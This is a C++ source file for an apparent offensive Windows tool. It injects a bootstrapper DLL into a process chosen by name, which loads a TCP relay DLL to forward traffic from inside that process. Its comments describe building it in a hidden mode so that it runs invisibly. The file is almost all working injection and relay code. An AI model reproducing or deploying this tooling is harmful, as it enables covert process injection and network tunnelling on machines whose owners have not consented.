#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <stdlib.h>
#include <string>

#include "Injection.h"

using namespace std;

/* There are two defined entry points here, one for a  Windows
 * application, and another for a console application.
 * 
 * To switch between the two versions, we need to change our
 * subsystem dependency and then rebuild. The compiler will
 * automatically choose the appropriate entry point.
 * 
 * To enable Windows (hidden) mode, go to project properties, find the
 * 'linker' section and change the SubSystem option to Windows.
 * 
 * To enable console (debugging) mode, go to project properties, find
 * the 'linker' section and change the SubSystem option to Console.
 */

/* Since there are two entry points for this program, we really
 * ought to get to a common point as soon as possible.  This is that
 * common point.
 */
void true_main(LPWSTR* szArgList) {

    // Bootstrapper DLL Path
    char DllName[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, DllName);
    strcat_s(DllName, "\\Bootstrapper.dll");

    // TCPRelay DLL path + Arguments
    wchar_t RelayDllNameW[500];
    GetCurrentDirectory(MAX_PATH, RelayDllNameW);
    wcscat_s(RelayDllNameW, L"\\TCPRelay.dll ");
	wcscat_s(RelayDllNameW, szArgList[2]);
	wcscat_s(RelayDllNameW, L",");
	wcscat_s(RelayDllNameW, szArgList[3]);
	   	
	// Get the remote process PID and inject the bootsrapper DLL
	DWORD Pid = GetProcessIdByNameW(szArgList[1]);
    InjectAndRunThenUnload(Pid, DllName, "LoadManagedProject", RelayDllNameW);
}

/* By starting as a Windows application but not displaying any
 * windows, we can become effectively invisible.
 */
int __stdcall WinMain (HINSTANCE hInstance,
                       HINSTANCE hPrevInstance,
                       LPSTR lpCmdLine,
                       int cmdShow)
{
	LPWSTR* szArgList;
	int argCount;

	// Retrieving command line arguments
	szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
	if (szArgList == NULL)
	{
		MessageBox(NULL, L"Unable to parse command line", L"Error", MB_OK);
		return 10;
	}

	// Missing arguments.
	if (argCount != 4) {
		MessageBox(NULL, L"Missing arguments. Usage: tcprelayinjecter.exe <target_process_name> <listening_port> <destination_port> [destination IP]", L"Error", MB_OK);
		return 10;
	}
	else {
		true_main(szArgList);
	}
		
	LocalFree(szArgList);
    return 0;
}

/* In any case, it's useful to have a console window visible
 * for debugging purposes.  Use cout to your heart's content!
 */
/*
int main()
{
    true_main();
    return 0;
}
*/
